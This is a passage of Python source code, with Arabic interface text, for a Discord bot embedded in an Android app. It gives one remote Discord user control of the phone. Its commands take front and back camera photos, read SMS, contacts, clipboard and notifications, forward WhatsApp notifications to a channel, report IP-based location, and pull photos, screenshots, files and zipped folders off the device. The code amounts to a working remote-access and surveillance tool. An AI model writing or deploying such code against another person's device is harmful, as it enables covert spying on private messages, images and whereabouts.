        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    path = await asyncio.to_thread(bridge.capture_camera, 0)
    if not path or not os.path.isfile(path):
        await interaction.followup.send(
            "❌ فشل التصوير.\n"
            "تأكد من منح صلاحية الكاميرا للتطبيق."
        )
        return
    try:
        await interaction.followup.send(
            content=f"📷 كاميرا خلفية — `{os.path.basename(path)}`",
            file=discord.File(path)
        )
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}\n`{path}`")


@bot.tree.command(name="snap_front", description="صورة بالكاميرا الأمامية")
async def snap_front_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    path = await asyncio.to_thread(bridge.capture_camera, 1)
    if not path or not os.path.isfile(path):
        await interaction.followup.send(
            "❌ فشل التصوير.\n"
            "تأكد من منح صلاحية الكاميرا."
        )
        return
    try:
        await interaction.followup.send(
            content=f"🤳 كاميرا أمامية — `{os.path.basename(path)}`",
            file=discord.File(path)
        )
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}\n`{path}`")


@bot.tree.command(name="camera_app", description="افتح تطبيق الكاميرا")
async def camera_app_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    result = await asyncio.to_thread(bridge.open_camera_app)
    await interaction.followup.send(result)


@bot.tree.command(name="battery", description="حالة البطارية")
async def battery_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    data = await asyncio.to_thread(bridge.get_battery)
    try:
        d = json.loads(data)
        if not d:
            await interaction.followup.send("❌ لم أتمكن من قراءة البطارية.")
            return
        await interaction.followup.send(
            f"🔋 **{d.get('percentage', '?')}%**\n"
            f"الحالة: `{d.get('status', '?')}`\n"
            f"الحرارة: `{d.get('temperature', '?')}°C`\n"
            f"الصحة: `{d.get('health', '?')}`"
        )
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}")


@bot.tree.command(name="clipboard", description="قراءة الحافظة")
async def clipboard_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    text = await asyncio.to_thread(bridge.get_clipboard)
    if text:
        await interaction.followup.send(f"📋 **الحافظة:**\n```\n{text[:1800]}\n```")
    else:
        await interaction.followup.send("📋 الحافظة فارغة.")


@bot.tree.command(name="toast", description="رسالة على الشاشة")
@app_commands.describe(text="النص")
async def toast_cmd(interaction: discord.Interaction, text: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    ok = await asyncio.to_thread(bridge.show_toast, text[:100])
    await interaction.followup.send("✅ ظهرت الرسالة" if ok else "❌ فشل")


@bot.tree.command(name="dial", description="لوحة الاتصال")
@app_commands.describe(phone="الرقم")
async def dial_cmd(interaction: discord.Interaction, phone: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    result = await asyncio.to_thread(bridge.dial, phone)
    await interaction.followup.send(result)


# ==========================================================
# الأوامر - 5) واتساب
# ==========================================================
@bot.tree.command(name="wa_home", description="واتساب الرئيسية")
async def wa_home_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    result = await asyncio.to_thread(bridge.open_whatsapp_home)
    await interaction.followup.send(result)


@bot.tree.command(name="wa", description="فتح محادثة واتساب")
@app_commands.describe(phone="الرقم", text="نص جاهز")
async def wa_cmd(interaction: discord.Interaction, phone: str = None, text: str = None):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    result = await asyncio.to_thread(bridge.open_whatsapp_chat, phone or "", text or "")
    await interaction.followup.send(result)


# ==========================================================
# الأوامر - 6) الإشعارات
# ==========================================================
@bot.tree.command(name="notifications", description="قراءة الإشعارات")
@app_commands.describe(app="فلتر الحزمة", limit="العدد (1-50)")
async def notifications_cmd(interaction: discord.Interaction,
                             app: str = None, limit: int = 20):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    limit = max(1, min(50, limit))
    await interaction.response.defer()
    data = await asyncio.to_thread(bridge.get_notifications, app or "", limit)
    try:
        arr = json.loads(data)
    except Exception:
        arr = []

    if not arr:
        if not HAS_NOTIF_ACCESS:
            await interaction.followup.send(
                "❌ لا توجد صلاحية للوصول للإشعارات.\n\n"
                "**الحل:**\n"
                "1. افتح التطبيق\n"
                "2. اضغط زر **منح صلاحية الإشعارات**\n"
                "3. فعّل **MyFirstApp** في القائمة"
            )
        else:
            await interaction.followup.send("لا توجد إشعارات مطابقة.")
        return

    lines = [f"🔔 **{len(arr)} إشعار**" + (f" (من `{app}`)" if app else "") + ":\n"]
    for n in arr[:limit]:
        pkg = n.get("packageName", "?")
        title = n.get("title", "")
        content = n.get("content", "")
        lines.append(f"📱 `{pkg}`")
        if title:
            lines.append(f"**{title[:80]}**")
        if content:
            lines.append(content[:200])
        lines.append("")

    text_out = "\n".join(lines)
    if len(text_out) > 1900:
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.txt',
                                          mode='w', encoding='utf-8')
        tmp.write(text_out)
        tmp.close()
        try:
            await interaction.followup.send(file=discord.File(tmp.name, filename="notifications.txt"))
        finally:
            try:
                os.remove(tmp.name)
            except Exception:
                pass
    else:
        await interaction.followup.send(text_out)


@bot.tree.command(name="notif_watch", description="إدارة مراقب الإشعارات")
@app_commands.describe(action="on/off/status", channel_id="معرف القناة", whatsapp_only="واتساب فقط؟")
async def notif_watch_cmd(interaction: discord.Interaction, action: str = "status",
                          channel_id: str = None, whatsapp_only: bool = True):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    global NOTIF_CHANNEL_ID, NOTIF_WATCH_ENABLED, WHATSAPP_NOTIF_ONLY, _notif_task
    action = action.lower().strip()

    if action == "status":
        status = "✅ يعمل" if _notif_task and not _notif_task.done() else "❌ متوقف"
        await interaction.response.send_message(
            f"🔔 **حالة المراقب:** {status}\n"
            f"📢 القناة: `{NOTIF_CHANNEL_ID or 'غير معينة'}`\n"
            f"💬 واتساب فقط: {'✅' if WHATSAPP_NOTIF_ONLY else '❌'}\n"
            f"📦 الحزم: `{','.join(NOTIF_WATCH_PKGS[:5])}`"
        )
        return

    if action == "on":
        target = None
        if channel_id:
            try:
                target = int(channel_id.strip())
            except ValueError:
                await interaction.response.send_message("معرف قناة غير صالح.", ephemeral=True)
                return
        else:
            target = interaction.channel_id
        NOTIF_CHANNEL_ID = target
        NOTIF_WATCH_ENABLED = True
        WHATSAPP_NOTIF_ONLY = whatsapp_only
        await interaction.response.defer()
        if _notif_task is None or _notif_task.done():
            _notif_task = asyncio.create_task(_notification_watcher_loop())
        await interaction.followup.send(
            f"✅ تم تفعيل المراقب\n"
            f"📢 القناة: <#{target}>\n"
            f"💬 واتساب فقط: {'✅' if whatsapp_only else '❌'}"
        )
        return

    if action == "off":
        NOTIF_WATCH_ENABLED = False
        await interaction.response.send_message("⛔ تم إيقاف المراقب.")
        return

    await interaction.response.send_message("استخدم: on/off/status", ephemeral=True)


# ==========================================================
# الأوامر - 7) SMS
# ==========================================================
@bot.tree.command(name="sms", description="آخر الرسائل")
@app_commands.describe(limit="العدد (1-30)", search="بحث")
async def sms_cmd(interaction: discord.Interaction, limit: int = 10, search: str = None):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    limit = max(1, min(30, limit))
    await interaction.response.defer()
    data = await asyncio.to_thread(bridge.get_sms, limit * 3 if search else limit, search or "")
    try:
        arr = json.loads(data)
    except Exception:
        arr = []
    if search:
        q = search.lower()
        arr = [s for s in arr if q in json.dumps(s, ensure_ascii=False).lower()]
    arr = arr[:limit]
    if not arr:
        await interaction.followup.send("لا توجد رسائل.")
        return
    lines = [f"📩 **{len(arr)} رسالة SMS**" + (f" (بحث: `{search}`)" if search else "") + ":\n"]
    for s in arr:
        num = s.get("number", "?")
        body = s.get("body", "")
        lines.append(f"📱 `{num}`")
        lines.append(body[:200])
        lines.append("")
    text_out = "\n".join(lines)
    if len(text_out) > 1900:
        await interaction.followup.send(text_out[:1900])
    else:
        await interaction.followup.send(text_out)


@bot.tree.command(name="send_sms", description="رسالة SMS جديدة")
@app_commands.describe(phone="الرقم", text="النص")
async def send_sms_cmd(interaction: discord.Interaction, phone: str, text: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    result = await asyncio.to_thread(bridge.send_sms, phone, text)
    await interaction.followup.send(result + "\nاضغط زر الإرسال على الهاتف.")


# ==========================================================
# الأوامر - 8) جهات الاتصال
# ==========================================================
@bot.tree.command(name="contacts", description="جهات الاتصال")
@app_commands.describe(search="بحث")
async def contacts_cmd(interaction: discord.Interaction, search: str = None):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    data = await asyncio.to_thread(bridge.get_contacts, search or "")
    try:
        arr = json.loads(data)
    except Exception:
        arr = []
    if not arr:
        await interaction.followup.send("لا توجد جهات اتصال.")
        return
    lines = [f"👥 **{len(arr)} جهة**" + (f" (بحث: `{search}`)" if search else "") + ":\n"]
    for c in arr[:30]:
        lines.append(f"• **{c.get('name', '?')}** — `{c.get('number', '?')}`")
    if len(arr) > 30:
        lines.append(f"\n... و {len(arr)-30} أخرى")
    await interaction.followup.send("\n".join(lines)[:1900])


# ==========================================================
# الأوامر - 9) التطبيقات
# ==========================================================
@bot.tree.command(name="openapp", description="افتح تطبيقًا")
@app_commands.describe(app="اسم التطبيق أو الحزمة")
async def openapp_cmd(interaction: discord.Interaction, app: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    query = app.strip()
    if query.lower() in ("whatsapp", "wa"):
        result = await asyncio.to_thread(bridge.open_whatsapp_home)
    else:
        result = await asyncio.to_thread(bridge.open_app, query)
    await interaction.followup.send(result)


@bot.tree.command(name="apps", description="قائمة التطبيقات")
@app_commands.describe(search="بحث")
async def apps_cmd(interaction: discord.Interaction, search: str = None):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    apps = await asyncio.to_thread(bridge.list_installed_apps)
    if not apps:
        await interaction.followup.send("❌ لم أتمكن من قراءة التطبيقات.")
        return
    if search:
        q = search.lower()
        apps = [p for p in apps if q in p.lower()]
    apps = sorted(apps)
    if not apps:
        await interaction.followup.send("لا نتائج.")
        return
    chunks = [apps[i:i+25] for i in range(0, min(len(apps), 100), 25)]
    for chunk in chunks[:4]:
        options = [discord.SelectOption(label=p[:100], value=short_key(p))
                   for p in chunk]
        view = discord.ui.View(timeout=900)
        select = discord.ui.Select(
            placeholder=f"اختر تطبيقًا (إجمالي {len(apps)})",
            options=options
        )

        async def cb(it):
            if it.user.id != ALLOWED_USER_ID:
                await it.response.send_message("غير مصرح.", ephemeral=True)
                return
            key = it.data["values"][0]
            pkg = resolve_key(key)
            await it.response.defer()
            result = await asyncio.to_thread(bridge.open_app, pkg)
            await it.followup.send(f"{result}")

        select.callback = cb
        view.add_item(select)
        await interaction.followup.send(
            f"📱 **{len(apps)} تطبيق**" + (f" (بحث: `{search}`)" if search else ""),
            view=view
        )


@bot.tree.command(name="openurl", description="افتح رابطًا")
@app_commands.describe(url="الرابط")
async def openurl_cmd(interaction: discord.Interaction, url: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    result = await asyncio.to_thread(bridge.open_url, url.strip())
    await interaction.followup.send(f"{result}\n`{url}`")


@bot.tree.command(name="open", description="افتح ملفًا")
@app_commands.describe(path="المسار")
async def open_cmd(interaction: discord.Interaction, path: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    if not is_path_allowed(path) or not os.path.isfile(path):
        await interaction.response.send_message("مسار غير صالح.", ephemeral=True)
        return
    await interaction.response.defer()
    result = await asyncio.to_thread(bridge.open_file, path)
    await interaction.followup.send(f"{result}\n`{path}`")


# ==========================================================
# الأوامر - 10) المفضلة والرفع
# ==========================================================
@bot.tree.command(name="save", description="أضف للمفضلة")
@app_commands.describe(path="المسار", label="اسم مختصر")
async def save_cmd(interaction: discord.Interaction, path: str, label: str = None):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    if not is_path_allowed(path) or not os.path.isdir(path):
        await interaction.response.send_message("مسار غير صالح.", ephemeral=True)
        return
    FAVORITES.append({"path": path, "label": label or os.path.basename(path) or path})
    await interaction.response.send_message(f"⭐ حُفظ: `{path}`")


@bot.tree.command(name="favorites", description="اعرض المفضلة")
async def favorites_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    if not FAVORITES:
        await interaction.response.send_message("لا توجد مفضلات. استخدم `/save`.", ephemeral=True)
        return
    options = [discord.SelectOption(
        label=f["label"][:100],
        value=short_key(f["path"]),
        description=f["path"][:100]
    ) for f in FAVORITES[:25]]
    view = discord.ui.View(timeout=900)
    select = discord.ui.Select(placeholder="اختر مجلدًا", options=options)

    async def cb(it):
        if it.user.id != ALLOWED_USER_ID:
            await it.response.send_message("غير مصرح.", ephemeral=True)
            return
        key = it.data["values"][0]
        p = resolve_key(key)
        if not p or not os.path.isdir(p):
            await it.response.send_message("غير موجود.", ephemeral=True)
            return
        v = FileBrowserView(p, 0)
        try:
            await it.response.edit_message(content=v.title(), view=v)
        except Exception:
            await it.response.send_message(content=v.title(), view=v)

    select.callback = cb
    view.add_item(select)
    await interaction.response.send_message("⭐ المفضلة:", view=view)


@bot.tree.command(name="upload", description="معلومات الرفع")
async def upload_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.send_message(
        f"📥 أرسل أي ملف كمرفق وسيُحفظ في:\n`{UPLOAD_DIR}`",
        ephemeral=True
    )


# ==========================================================
# الأوامر - 11) السحب
# ==========================================================
@bot.tree.command(name="latest", description="آخر الصور")
@app_commands.describe(folder="المجلد", count="العدد (1-10)")
async def latest_cmd(interaction: discord.Interaction, folder: str = None, count: int = 5):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    folder = folder or _find_dir_in_roots(CAMERA_PATHS) or os.path.join(ALLOWED_ROOT, "DCIM", "Camera")
    count = max(1, min(10, count))
    await interaction.response.defer()
    try:
        if not is_path_allowed(folder) or not os.path.isdir(folder):
            await interaction.followup.send("مجلد غير صالح.")
            return
        files = [os.path.join(folder, f) for f in os.listdir(folder)
                 if f.lower().endswith((".jpg", ".jpeg", ".png", ".webp", ".gif", ".heic"))]
        files.sort(key=os.path.getmtime, reverse=True)
        files = files[:count]
        if not files:
            await interaction.followup.send("لا توجد صور.")
            return
        for fp in files:
            compressed = await _compress_image(fp)
            try:
                await interaction.followup.send(file=discord.File(compressed))
                await asyncio.sleep(0.5)
            except Exception as e:
                await interaction.followup.send(f"تعذر: {e}")
            finally:
                if compressed != fp and os.path.exists(compressed):
                    try:
                        os.remove(compressed)
                    except Exception:
                        pass
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}")


@bot.tree.command(name="pull_camera", description="اسحب آخر n صورة")
@app_commands.describe(n="العدد (1-20)")
async def pull_camera_cmd(interaction: discord.Interaction, n: int = 5):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    path = _find_dir_in_roots(CAMERA_PATHS)
    if not path:
        await interaction.followup.send("لم أجد مجلد الكاميرا.")
        return
    await _send_images_bulk(interaction, path, limit=max(1, min(20, n)))


@bot.tree.command(name="pull_screens", description="اسحب آخر n لقطة")
@app_commands.describe(n="العدد (1-20)")
async def pull_screens_cmd(interaction: discord.Interaction, n: int = 5):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    path = _find_dir_in_roots(SCREENSHOT_PATHS)
    if not path:
        await interaction.followup.send("لم أجد مجلد اللقطات.")
        return
    await _send_images_bulk(interaction, path, limit=max(1, min(20, n)))


@bot.tree.command(name="resume", description="استئناف السحب")
async def resume_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    d = bulk_state.get('resume_dir')
    i = bulk_state.get('resume_index', 0)
    if not d:
        await interaction.response.send_message("لا يوجد سحب موقوف.", ephemeral=True)
        return
    await interaction.response.defer()
    bulk_state['suspended'] = False
    await _send_images_bulk(interaction, d, start_index=i)


@bot.tree.command(name="stop", description="أوقف السحب")
async def stop_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    bulk_state['suspended'] = True
    await interaction.response.send_message("⛔ سيتم الإيقاف قريبًا.")


@bot.tree.command(name="get", description="سحب ملف")
@app_commands.describe(path="المسار")
async def get_cmd(interaction: discord.Interaction, path: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    await _send_any_file(interaction, path)


@bot.tree.command(name="zip", description="ضغط مجلد")
@app_commands.describe(path="المسار")
async def zip_cmd(interaction: discord.Interaction, path: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    await _send_zip_of_dir(interaction, path)


# ==========================================================
# الأوامر - 12) التخزين
# ==========================================================
@bot.tree.command(name="roots", description="جذور التخزين")
async def roots_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    if not DISCOVERED_ROOTS:
        await interaction.response.send_message("لا جذور!", ephemeral=True)
        return
    lines = ["**📚 جذور التخزين:**\n"]
    for i, r in enumerate(DISCOVERED_ROOTS, 1):
        marker = " ⭐" if r == ALLOWED_ROOT else ""
        lines.append(f"`{i}.` `{r}`{marker}")
    lines.append(f"\n**النشط:** `{ALLOWED_ROOT}`")
    await interaction.response.send_message("\n".join(lines))


@bot.tree.command(name="setroot", description="عيّن جذرًا")
@app_commands.describe(path="المسار")
async def setroot_cmd(interaction: discord.Interaction, path: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    global ALLOWED_ROOT
    if not os.path.isdir(path):
        await interaction.response.send_message(f"ليس مجلدًا: `{path}`", ephemeral=True)
        return
    real = os.path.realpath(path)
    if real not in [os.path.realpath(r) for r in DISCOVERED_ROOTS]:
        DISCOVERED_ROOTS.append(real)
    ALLOWED_ROOT = real
    await interaction.response.send_message(f"✅ الجذر الآن: `{ALLOWED_ROOT}`")


@bot.tree.command(name="rescan", description="إعادة اكتشاف الجذور")
async def rescan_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    global DISCOVERED_ROOTS, ALLOWED_ROOT
    await interaction.response.defer()
    old = set(DISCOVERED_ROOTS)
    DISCOVERED_ROOTS = _discover_storage_roots()
    new = set(DISCOVERED_ROOTS) - old
    if DISCOVERED_ROOTS:
        ALLOWED_ROOT = DISCOVERED_ROOTS[0]
    msg = [
        f"🔄 اكتمل",
        f"📚 الإجمالي: **{len(DISCOVERED_ROOTS)}**",
        f"🆕 جديد: **{len(new)}**",
        f"📁 النشط: `{ALLOWED_ROOT}`",
    ]
    await interaction.followup.send("\n".join(msg))


# ==========================================================
# الأوامر - 13) معلومات
# ==========================================================
@bot.tree.command(name="ip", description="عنوان IP")
async def ip_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    try:
        import requests
        r = requests.get("https://api.ipify.org?format=json", timeout=10)
        await interaction.followup.send(f"🌐 IP: `{r.json().get('ip')}`")
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}")


@bot.tree.command(name="location", description="الموقع الجغرافي")
async def location_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    try:
        import requests
        ip = requests.get("https://api.ipify.org?format=json", timeout=10).json().get('ip')
        data = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
        if data.get('status') == 'fail':
            await interaction.followup.send("فشل.")
            return
        lat, lon = data['lat'], data['lon']
        await interaction.followup.send(
            f"📍 {data.get('city', '?')}, {data.get('country', '?')}\n"
            f"https://www.google.com/maps?q={lat},{lon}"
        )
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}")


@bot.tree.command(name="sysinfo", description="معلومات الجهاز")
async def sysinfo_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    info = [
        f"🖥️ الجهاز: `{DEVICE_NAME}`",
        f"💻 النظام: `{platform.system()} {platform.release()}`",
        f"🐍 Python: `{sys.version.split()[0]}`",
        f"📁 الجذر: `{ALLOWED_ROOT}`",
        f"📥 الاستقبال: `{UPLOAD_DIR}`",
        f"📸 اللقطات: `{SCREENSHOT_DIR}`",
        f"📚 الجذور: **{len(DISCOVERED_ROOTS)}**",
        f"🖼️ PIL: {'✅' if HAS_PIL else '❌'}",
        f"🔔 الإشعارات: {'✅' if HAS_NOTIF_ACCESS else '❌'}",
    ]
    try:
        dev = await asyncio.to_thread(bridge.get_device_info)
        d = dev if isinstance(dev, dict) else {}
        info.append(f"📱 الطراز: `{d.get('model', '?')}`")
        info.append(f"🏭 المُصنّع: `{d.get('manufacturer', '?')}`")
        info.append(f"🤖 أندرويد: `{d.get('android', '?')}`")
    except Exception:
        pass
    await interaction.followup.send("\n".join(info))


# ==========================================================
# start_bot / stop_bot (من Java)
# ==========================================================
def start_bot():
    """يُستدعى من Java."""
    global _bot_loop
    if not DISCORD_TOKEN or DISCORD_TOKEN.startswith("ضع_"):
        log.error("❌ DISCORD_TOKEN غير معين")
        return
    log.info(f"🚀 تشغيل البوت على {DEVICE_NAME}")
    try:
        _bot_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(_bot_loop)
        _bot_loop.run_until_complete(bot.start(DISCORD_TOKEN))
    except Exception as e:
        log.error(f"Bot error: {e}")


def stop_bot():
    """يُستدعى من Java."""
    global _bot_loop
    try:
        if _bot_loop and _bot_loop.is_running():
            asyncio.run_coroutine_threadsafe(bot.close(), _bot_loop)
        log.info("⛔ تم إيقاف البوت")
    except Exception as e:
        log.error(f"Stop error: {e}")